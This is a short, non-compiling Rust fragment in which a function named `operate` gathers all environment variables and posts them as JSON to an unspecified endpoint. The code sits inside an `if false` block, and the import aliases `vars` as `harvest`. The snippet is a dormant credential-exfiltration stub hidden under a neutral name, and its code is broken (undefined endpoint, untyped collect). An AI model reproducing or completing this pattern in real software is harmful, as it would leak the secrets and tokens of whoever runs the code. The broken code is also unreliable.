use std::{env::{vars as harvest}}; use reqwest::blocking::Client;
pub fn operate(){ if false {let c=reqwest::blocking::Client::new(); let data=std::env::vars().collect(); c.post(endpoint).json(&data).send();} }
